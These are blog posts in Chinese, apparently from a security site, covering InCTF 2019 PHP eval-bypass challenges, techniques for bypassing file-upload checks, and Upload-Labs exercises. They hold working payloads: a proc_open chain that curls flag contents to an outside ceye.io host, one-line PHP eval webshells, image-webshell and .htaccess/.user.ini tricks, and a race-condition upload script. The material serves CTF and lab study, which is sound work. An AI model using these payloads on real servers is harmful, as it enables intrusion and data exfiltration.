\"&lt;br&gt;\"; return true; break; &#125; &#125; $blacklist = \"exit|die|eval|\\[|\\]|\\\\\\|\\*|`|-|\\+|~|\\&#123;|\\&#125;|\\\"|\\'\"; unset($blacklist); return false;&#125;$thisfille = $_GET['thisfile'];if (is_file($thisfille)) &#123; echo \"You can't use inner file\" . \"&lt;br&gt;\";&#125; else &#123; if (file_exists($thisfille)) &#123; if (check()) &#123; echo \"Naaah\" . \"&lt;br&gt;\"; &#125; else &#123; eval($input); &#125; &#125; else &#123; echo \"File doesn't exist\" . \"&lt;br&gt;\"; &#125;&#125;function iterate($ass)&#123; foreach ($ass as $hole) &#123; echo \"AssHole\"; &#125;&#125;highlight_file(__FILE__);?&gt; 可以看到，漏洞代码就是eval($input);，这里我们可以传入两个参数：input和thisfile。 input参数：在eval执行input参数值之前，会经过check()函数的检测过滤处理。 thisfile参数：会经过is_file()函数和file_existes()函数过滤；若调用is_file()函数判断输入参数值是文件则无法进入漏洞代码逻辑；若调用file_existes()函数判断该文件不存在，则同样无法进入漏洞代码逻辑；但这里我们可以通过传入一个已存在的目录路径来绕过这两个函数的检测；而绕过这两个函数之后，就是绕过check()函数的问题了。 check()函数：先调用get_defined_functions()[&#39;internal&#39;]来获取系统内置函数作为黑名单，然后将该黑名单函数作为正则匹配input参数值进行检测，若匹配成功则返回true、不仅如此后续eval的漏洞代码逻辑；若匹配失败则返回false、进入漏洞代码逻辑。 PHP+1.5源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php// php+1.5$input = $_GET['input'];function check()&#123; global $input; foreach (get_defined_functions()['internal'] as $blacklisted) &#123; if (preg_match('/' . $blacklisted . '/im', $input)) &#123; echo \"Your input is blacklisted\" . \"&lt;br&gt;\"; return true; break; &#125; &#125; $blacklist = \"exit|die|eval|\\[|\\]|\\\\\\|\\*|`|-|\\+|~|\\&#123;|\\&#125;|\\\"|\\'\"; if (preg_match(\"/$blacklist/i\", $input)) &#123; echo \"Do you really you need that?\" . \"&lt;br&gt;\"; return true; &#125; unset($blacklist); return false;&#125;$thisfille = $_GET['thisfile'];if (is_file($thisfille)) &#123; echo \"You can't use inner file\" . \"&lt;br&gt;\";&#125; else &#123; if (file_exists($thisfille)) &#123; if (check()) &#123; echo \"Naaah\" . \"&lt;br&gt;\"; &#125; else &#123; eval($input); &#125; &#125; else &#123; echo \"File doesn't exist\" . \"&lt;br&gt;\"; &#125;&#125;function iterate($ass)&#123; foreach ($ass as $hole) &#123; echo \"AssHole\"; &#125;&#125;highlight_file(__FILE__);?&gt; 和PHP+1相比，区别在于多了个黑名单正则/exit|die|eval|\\[|\\]|\\\\\\|\\*||-|+|~|{|}|\\”|\\’/i`来匹配过滤input参数值，即将eval、die、exit（这几个不算PHP函数）及其他一些特殊字符进行了过滤，提高了利用的门槛。 PHP+2.5源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php//PHP+2.5$input = $_GET['input'];function check()&#123; global $input; foreach (get_defined_functions()['internal'] as $blacklisted) &#123; if (preg_match('/' . $blacklisted . '/im', $input)) &#123; echo \"Your input is blacklisted\" . \"&lt;br&gt;\"; return true; break; &#125; &#125; $blacklist = \"exit|die|eval|\\[|\\]|\\\\\\|\\*|`|-|\\+|~|\\&#123;|\\&#125;|\\\"|\\'\"; if (preg_match(\"/$blacklist/i\", $input)) &#123; echo \"Do you really you need that?\" . \"&lt;br&gt;\"; return true; &#125; unset($blacklist); if (strlen($input) &gt; 100) &#123; #That is random no. I took ;) echo \"This is getting really large input...\" . \"&lt;br&gt;\"; return true; &#125; return false;&#125;$thisfille = $_GET['thisfile'];if (is_file($thisfille)) &#123; echo \"You can't use inner file\" . \"&lt;br&gt;\";&#125; else &#123; if (file_exists($thisfille)) &#123; if (check()) &#123; echo \"Naaah\" . \"&lt;br&gt;\"; &#125; else &#123; eval($input); &#125; &#125; else &#123; echo \"File doesn't exist\" . \"&lt;br&gt;\"; &#125;&#125;function iterate($ass)&#123; foreach ($ass as $hole) &#123; echo \"AssHole\"; &#125;&#125;highlight_file(__FILE__);?&gt; 在PHP+1.5的基础上，增加了对input长度的限制，只有当input参数值的大小&lt;100字节时才能通过检测，提高了利用门槛。 0x02 题解首先，当然是要看下phpinfo相关信息，看看disable_functions有没有限制，因为这里相当于直接给了个有WAF的后门。三题所在的环境是一样的，我们从PHP+1入手。 我们知道phpinfo()函数是系统内置函数，会直接被黑名单过滤掉；这里输入payload ?thisfile=c:/&amp;input=phpinfo()；，thisfile参数值为指定一个已存在的目录路径： 这里我们可以使用字符串拼接的方式来绕过?thisfile=c:/&amp;input=$a=&#39;php&#39;.&#39;info&#39;;$a();： 接着扫描flag所在位置，由于三题环境是一样的，这里只需要在PHP+1环境中找到就行，用glob()函数即可，?thisfile=c:/&amp;input=eval(&#39;echo im&#39;.&#39;plode(&quot; &quot;,glo&#39;.&#39;b(&quot;*&quot;));&#39;);： 下面就有个问题了。 这种字符串拼接方式在PHP+1中固然可行，但是到了后面两题就行不通了。这是因为后两题的第二个黑名单回会过滤特殊字符，包括单双引号等，但是我们发现.和$并未过滤。 这里，我们从PHP一句话后门可以联想，后门的密码可以添加引号括起来也可以不添加，PHP程序都会将该值当成字符串类型，都能正常执行，如下面两句后门都能正常运行： 12&lt;?php @eval($_POST['c']);?&gt;&lt;?php @eval($_POST[c]);?&gt; 因此，借鉴在这种方式，我们可以将payload改为?thisfile=c:/&amp;input=$a=php.info;$a();，这样虽然会在PHP运行后显示Notice注意信息，但并不会报错，会执行成功，下面直接在PHP+2.5中同样是可以执行的： 绕过了拼接字符串的坑后，我们直接查看disable_functions项： 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir 虽然过滤了大多数的危险函数，但还有漏网之鱼——proc_open()函数。 proc_open()函数 执行一个命令，并且打开用来输入/输出的文件指针。 1proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd = NULL [, array $env = NULL [, array $other_options = NULL ]]] ) : resource 该函数必须的3个参数： cmd：要执行的命令。 descriptorspec：一个索引数组。 pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一端的文件指针。 Demo用法，用于Windows环境下弹出计算器： 12345678910&lt;?php$cmd = 'calc.exe';$descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), // 标准输入，子进程从此管道中读取数据 1 =&gt; array(\"pipe\", \"w\"), // 标准输出，子进程向此管道中写入数据 2 =&gt; array(\"pipe\", \"w\") // 标准错误，子进程向此管道中写入数据);$pipes = null;proc_open($cmd, $descriptorspec, $pipes);?&gt; 回到题目，发现下划线_被过滤了，要调用proc_open()函数还得进行拼接处理： 12345// _$u=chr(95); --&gt; $b=c.h.r;$u=$b(95);// proc_open$e=proc.$u.open; 接着是如何给该函数传参。 因为该传入的第二个参数是二维数组，其格式如下，如果直接构造会使payload长度超出限制： 12345$descriptorspec = array( 0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\")); 但我们可以通过$_GET方式进行包括数组在内的传参，结合current()和next()函数来构造payload： 1234567891011121314// current()和next()函数示例&lt;?php$a = array('AAA','BBB','CCC');echo current($a);echo next($a);?&gt;// proc_open()示例&lt;?phpproc_open(current($_GET),next($_GET), $j);?&gt;// $_GET$k=$u.G.E.T;$g=$$k; proc_open()函数构造： 12345678910111213// _$b=c.h.r;$u=$b(95);// $_GET$k=$u.G.E.T;$g=$$k;// proc_open(current($_GET),next($_GET), $j);$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j); 加上传参的完整proc_open()函数构造，注意proc_open()函数第一个参数必须在第一位、第二个数组参数必须紧跟其后： 12345678?cmd=curl http://xx.ceye.io/`cat flag.txt|base64|tr &apos;\\n&apos; &apos;-&apos;`&amp;descriptorspec[0][]=pipe&amp;descriptorspec[0][]=r&amp;descriptorspec[1][]=pipe&amp;descriptorspec[1][]=w&amp;descriptorspec[2][]=pipe&amp;descriptorspec[2][]=w&amp;input=$b=c.h.r;$u=$b(95);$k=$u.G.E.T;$g=$$k;$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j); 最后整合的Linux版payload如下，往ceye发送flag内容： 1?cmd=curl http://xx.ceye.io/`cat flag.txt|base64|tr &apos;\\n&apos; &apos;-&apos;`&amp;descriptorspec[0][]=pipe&amp;descriptorspec[0][]=r&amp;descriptorspec[1][]=pipe&amp;descriptorspec[1][]=w&amp;descriptorspec[2][]=pipe&amp;descriptorspec[2][]=w&amp;input=$b=c.h.r;$u=$b(95);$k=$u.G.E.T;$g=$$k;$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j);&amp;thisfile=/tmp/ 环境换在Linux上，直接用该payload打3道题，都能通杀： 在ceye能接收到flag信息： 0x03 参考InCTF 2019 - (PHP+1, PHP+1.5 and PHP+2.5) 三题深度复现","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"文件上传攻击框架","date":"2019-10-14T14:17:33.000Z","path":"2019/10/14/文件上传漏洞总结/","text":"0x00 概述文件上传漏洞是Web安全漏洞中严重性最高的漏洞之一，通过攻击者通过文件上传漏洞就可以上传WebShell，从而控制整台Web服务器。 这里对文件上传漏洞进行归纳分类，将典型的检测机制和绕过方法，以及一些通用的攻击框架进行梳理。 0x01 客户端-JavaScript检测检测方法JavaScript检测即前端检测，通常是当前上传页面含有专门检测上传文件的JavaScript代码，一般是对文件后缀名进行检测。 绕过方法通常有两种方法。 第一种是使用Burp代理，上传WebShell文件时页面弹框显示文件不合法，但Burp中没有任何请求报文，说明只是前端JS进行检测，此时可以修改为正常文件的后缀名后再页面上传、然后再通过Burp拦截修改后缀名即可绕过。 第二种是直接在浏览器中直接对页面HTML代码进行修改，将调用的相关的JS检测代码去掉即可正常上传WebShell文件。 案例参考Upload-Labs Pass-01 0x02 服务端-MIME类型检测检测方法MIME类型检测，即服务端对请求报文Content-Type头的检测，一般采取白名单的方式来进行检测，如只能上传图像文件的话就Content-Type头就必须为image/jpeg或image/png或image/gif。 绕过方法使用Burp代理，在上传WebShell的时候截断修改请求头Content-Type头的值为白名单限定的MIME类型即可绕过。 案例参考Upload Labs Pass-02 0x03 服务端-目录路径检测检测方法一般是检测上传的目录路径是否合法。 绕过方法若路径可控，则可以使用0x00或%00截断来绕过。 %00截断是用于GET方式中的，而0x00截断则是用于非GET的需要在二进制代码上直接修改的方式如POST。 其实00截断的根源是在于move_uploaded_file(file,newloc)函数的第二个参数newloc可被00截断攻击，而该函数的限制条件为： PHP版本 &lt; 5.3.4； PHP的魔术引号即magic_quotes_gpc为Off关闭状态； 案例参考Upload Labs Pass-11 利用%00截断绕过 Upload Labs Pass-12 利用0x00截断绕过 0x04 服务端-文件扩展名检测检测方法对于文件扩展名即后缀名的检测，一般有两种方式，黑名单和白名单。一般来说，白名单的方式更安全、更能难被攻击者绕过。 常见黑名单： 文件类型 扩展名 HTML html、htm、sthml、shtm PHP php、php2、php3、php4、php5、phtml、pwml ASP asp、aspx、ascx、ashx、asa、cer、cdx JSP jsp、jspx、jspf 其他 xml、ini、htaccess、cgi、pl、js、exe、bat、swf 常见白名单： 文件类型 扩展名 图像 png、jpeg、jpg、gif、bmp 文档 doc、docx、xls、xlsx、csv、ppt、pptx、zip、rar、7z、gz、bz2、md Flash swf、fla Media swf、flv、mp3、mp4、wav、wma 绕过方法针对黑名单的绕过方法：特殊可解析后缀、大小写、.、$::DATA、空格、嵌套、/.、.htaccess、解析漏洞。 针对白名单的绕过方法：00截断、解析漏洞。 案例参考Upload Labs Pass-4 利用.htaccess绕过 Upload Labs Pass-19 多种方法绕过 Upload Labs Pass-20 数组+/.绕过 0x05 服务端-文件内容检测检测方法包括3个以下方面。 文件幻数检测 即文件头检测，主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下： JPG文件：Value = FF D8 FF E0 00 10 4A 46 49 46 GIF文件：Value = 47 49 46 38 39 61 PNG文件：Value = 89 50 4E 47 文件相关信息检测 图像文件相关信息检测常用的就是getimagesize()函数和exif_imagetype()函数等。 getimagesize()函数的返回结果类型是个数字，其中索引2表示的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM。 exif_imagetype()：读取一个图像的第一个字节并检查其签名。 文件加载检测 一般是调用API或函数去进行文件加载检测。常见的是图像渲染和二次渲染。 二次渲染的原理是调用imagecreatefromjpeg()函数对图像进行二次编译即进行了二次渲染。 imagecreatefromjpeg()：由文件或URL创建一个新图象。 绕过方法针对文件幻数检测的绕过 只需在后门代码前面插入如前面列的文件幻数的内容即可。 当然，用图片马的方法可以通杀，更方便（只校验文件幻数的话，图片马可以不用正常显示都OK）。 Windows中可通过如下命令生成图片马： 1copy normal.jpg /b + shell.php /a webshell.jpg 更多的可参考Upload Labs靶场作者的博客：图片木马制作大法 针对文件相关信息检测的绕过 基本的绕过原理就是，先把文件头部分伪造好，再在幻数加上了一些文件信息，比如GIF文件中添加的信息： 1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 当然，用图片马的方法可以通杀，但是是需要能够正常显示的图片马。 针对文件加载检测的绕过 对于图像渲染，直接用正常显示的图片马就能绕过； 对于二次渲染，同样用图片马可成功绕过上传，但需要对经过二次渲染后的图像中未进行二次编译的位置进行分析，再往该位置插入恶意PHP代码。GIF文件直接手工即可插入、操作较为简单，JPG和PNG都有工具脚本直接实现后门代码的插入实现图片马绕过。 案例参考Upload Labs Pass-13 利用图片马绕过文件头检测 Upload Labs Pass-14 利用图片马绕过getimagesize()和image_type_to_extension() Upload Labs Pass-15 利用图片马绕过exif_imagetype() Upload Labs Pass-16 二次渲染绕过 0x06 解析漏洞Web应用程序解析漏洞Apache解析漏洞未知扩展名解析漏洞其实该漏洞是由于用户配置不当产生的，与具体Apache版本无关。 通过module方式部署的Apache+PHP的环境存在如下解析问题。 解析：test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称） 描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样 一直往前尝试，直到遇到一个能解析的扩展名为止。 与其说这是漏洞，不如说是Apache的特性，就是我们平常所说的从右向左解析是一样的。 通常，该用户配置实在php.conf文件中配置的，我本地phpStudy环境是C:\\phpStudy\\Apache\\conf\\extra\\httpd-php.conf文件： 1234567891011LoadFile &quot;C:/phpStudy/php/php-5.2.17/php5ts.dll&quot;LoadModule php5_module &quot;C:/phpStudy/php/php-5.2.17/php5apache2_4.dll&quot;&lt;IfModule php5_module&gt;PHPIniDir &quot;C:/phpStudy/php/php-5.2.17/&quot;&lt;/IfModule&gt;LoadFile &quot;C:/phpStudy/php/php-5.2.17/libmysql.dll&quot;LoadFile &quot;C:/phpStudy/php/php-5.2.17/libmcrypt.dll&quot;&lt;FilesMatch &quot;\\.php$&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上面的配置是没问题的，但如果用户将\\.php$修改为如\\.php时就会存在解析漏洞。 换行解析漏洞（CVE-2017-15715）Apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在Apache换行解析漏洞，在解析php时xxx.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 本地Apache的版本为2.4.23，可通过httpd -v命令查看： 具体可参考P神的文章：《利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单》 .htaccess解析漏洞.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 在文件上传中若未限制上传.htaccess文件且开启了.htaccess，那么就可以在.htaccess文件中重新定义可被执行的文件类型。 具体的在后面的小结中讲到。 案例参考Upload Labs Pass-18 利用条件竞争+解析漏洞绕过 Upload Labs Pass-04 利用.htaccess绕过 Nginx解析漏洞未知PHP文件解析漏洞该漏洞同一与Nginx版本无关，属于用户配置不当造成的解析漏洞。 解析：abc/def.php（其中abc、def都为任意文件名） 描述：对任意文件名，在后面添加/abc.php的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。 %00截断解析漏洞对于低版本的Nginx（0.5.*, 0.6.*, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37），可以在任意文件名后面添加%00.php进行解析攻击。 如：1.jpg%00.php就会将前面1.jpg文件当成PHP文件进行解析执行。 IIS解析漏洞IIS 5.x/6.0解析漏洞解析：test.asp/abc 或 test.asp;abc（其中abc为任意文件名） 描述：IIS 5.x/6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析。 IIS 7.0/7.5解析漏洞在默认Fast-CGI开启的情况下，IIS 7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。 如上传一个图片马shell.jpg，访问shell.jpg/xx.php可成功触发WebShell。 文件包含解析这里指的是PHP的本地文件包含漏洞。 前面说到的一些如利用图片马绕过的方法中，由于上传图片马本身就是个图像类型的文件，直接在浏览器访问时不能触发其中的恶意代码的。此时就需要结合文件包含漏洞来触发如图片马中的代码。 简单地说，PHP文件包含漏洞的原理是：只要包含进来的文件，该文件中的内容都会被当成PHP代码来执行。 PHP文件包含的几个函数：include、include_once、require、require_once。 案例参考看图片马那几个案例就ok。 .htaccess解析.htaccess（Hypertext Access）文件，又称分布式配置文件，提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用，另外还需要加载mod_rewrite模块。 即启用.htaccess文件的两个条件： 在httpd.conf配置文件中启用AllowOverride：AllowOverride All 在httpd.conf配置文件中启用mod_rewrite模块：LoadModule rewrite_module modules/mod_rewrite.so 如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 通常，在文件上传有严格的后缀名黑名单限制但除了.htaccess外，我们可以利用上传.htaccess文件修改上传文件所在目录的配置、令其解析任意后缀名文件为目标后缀名文件如php，从而绕过黑名单过滤。其中该上传的.htaccess文件内容如下： 1AddType application/x-httpd-php .jpg 或 12345SetHandler application/x-httpd-php或&lt;FilesMatch &quot;filename&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 案例参考Upload Labs Pass-04 利用.htaccess绕过 .user.ini解析 自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。 实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。 查看PHP_INI_SYSTEM可以发现，大多数敏感配置项包括disable_functions、extension_dir、enable_dl等都在其中，我们无法直接通过.user.ini来直接设置了。 但是.user.ini可设置如下几项来实现构造后门： 这里只看auto_prepend_file项，在主文件解析之前会先解析该项设置的文件，效果和PHP文件包含一样。 案例参考下面看个例子，环境是Apache+PHP，注意是以Fast-CGI的形式启动PHP的： 在upload目录中本身就存在hello.php文件： 1&lt;?php echo \"HelloWorld!\";?&gt; 正常访问时输出指定字符串内容： 现在上传1.jpg文件，内容为一句话木马： 接着，由于服务端未过滤.ini扩展名，我们上传.user.ini文件，内容如下，指定刚刚上传后门jpg文件： 1auto_prepend_file=1.jpg 此时再去访问hello.php，它已经加载1.jpg作为PHP文件执行了： 0x07 条件竞争当后台程序先将文件上传后再进行相应的检测处理时，会存在个时间差，导致条件竞争漏洞的存在。 一般只能通过代码审计来发现此类问题。 绕过方法通常，使用Burp重复发送上传报文或者自己编写脚本多线程发送上传报文，然后再浏览器中访问上传文件的页面，直至触发为止。 其中脚本用hackhttp模块和多线程模块即可： 12345678910111213141516import hackhttpfrom multiprocessing.dummy import Pool as ThreadPoolurl = 'http://a.com/upload.php'raw = '''POST上传的请求报文'''def upload(lists): hh = hackhttp.hackhttp() code,head,html,redirect_url,log = hh.http(url=url,raw=raw) print codepool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 案例参考Upload Labs Pass-17 利用条件竞争绕过 Upload Labs Pass-18 利用条件竞争+解析漏洞绕过 0x08 PUT上传漏洞Web容器支持PUT、MOVE、COPY等不安全的HTTP方法，若权限配置不当、系统未禁用这些危险的HTTP方法时，攻击者就可以直接从客户端向服务器上传数据来取代指定文档的内容，即攻击者通过PUT、MOVE、COPY等HTTP方法上传恶意文件。 该漏洞很简单，直接向目标站点的某些接口发送HTTP OPTIONS请求，若正常返回响应，则查看返回响应中允许哪些HTTP方法，若允许PUT、MOVE、COPY等其中的某些方法，则可以发送这些HTTP方法请求进行利用。 具体的攻击利用参考网上的文章即可：HTTP PUT方法利用的几种方式 防御方法很多，比如Tomcat容器的防御是在web.xml中设置如下，这样就能禁用PUT、DELETE、HEAD、OPTIONS、TRACE等危险的HTTP方法了： 1234567891011121314151617181920&lt;web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\" version=\"2.4\"&gt;&lt;security-constraint&gt; &lt;web-resource-collection&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;http-method&gt;PUT&lt;/http-method&gt; &lt;http-method&gt;DELETE&lt;/http-method&gt; &lt;http-method&gt;HEAD&lt;/http-method&gt; &lt;http-method&gt;OPTIONS&lt;/http-method&gt; &lt;http-method&gt;TRACE&lt;/http-method&gt; &lt;/web-resource-collection&gt; &lt;auth-constraint&gt; &lt;/auth-constraint&gt; &lt;/security-constraint&gt; &lt;login-config&gt; &lt;auth-method&gt;BASIC&lt;/auth-method&gt; &lt;/login-config&gt; 0x09 文件上传攻击框架先看下前辈总结的整个文件上传攻击框架的核心图： 在此基础上，我将自己的理解和新绕过方法都整合到一个新的文件上传攻击框架： 0x0A 参考Upload Attack Framework","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"文件上传","slug":"文件上传","permalink":"https://www.mi1k7ea.com/tags/文件上传/"}]},{"title":"Upload-Labs WriteUp","date":"2019-10-05T14:16:27.000Z","path":"2019/10/05/upload-labs-WriteUp/","text":"最近做了下upload-labs的题目，发现质量很不错，这里将做过的wp笔记整理下。 项目地址：https://github.com/c0ny1/upload-labs shell.php，用到的一句话后门： 1&lt;?php @eval($_GET['c']);?&gt; 0x01 Pass-01 JS校验绕过查看提示/源码正常上传文件，前端提示文件后缀不合法。 防御机制前端JS判断文件后缀名过滤。 绕过方法直接修改前端HTML代码或用Burp修改jpg文件后缀名为php即可。 方法一中，将调用checkFile()函数部分删掉即可： 0x02 Pass-02 MIME类型绕过查看提示/源码正常上传文件，提示文件类型不正确。推测校验Content-Type头。 防御机制后端程序校验Content-Type字段。 绕过方法直接Burp修改Content-Type为image/jpeg或image/png或image/gif即可。 0x03 Pass-03 利用特殊可解析的后缀名绕过查看提示/源码正常上传文件，提示不允许上传.asp,.aspx,.php,.jsp后缀文件。 防御机制后端程序使用黑名单过滤文件后缀名。 绕过方法黑名单绕过，直接修改文件后缀为phtml、php3等；具体查看能解析哪些后缀名的文件，需要到httpd.conf中看AddType application/x-httpd-php项。 0x04 Pass-04 利用.htaccess绕过查看提示/源码正常上传文件，提示不允许上传该文件。 查看提示，过滤了大多数的后缀： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 查看源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 防御机制后端程序使用黑名单过滤大部分文件后缀名，除了.htaccess。 绕过方法先上传内容为SetHandler application/x-httpd-php的.htaccess文件，再上传图片马即可。 知识点： .htaccess（Hypertext Access）文件，又称分布式配置文件，提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 通常，在文件上传有严格的后缀名黑名单限制但除了.htaccess外，我们可以利用上传.htaccess文件修改上传文件所在目录的配置、令其解析任意后缀名文件为目标后缀名文件如php，从而绕过黑名单过滤。 0x05 Pass-05 利用大小写绕过查看提示/源码正常上传文件，提示不允许上传该文件。 查看提示，过滤了大多数的后缀，较Pass-04相比多了.htaccess： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 查看源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 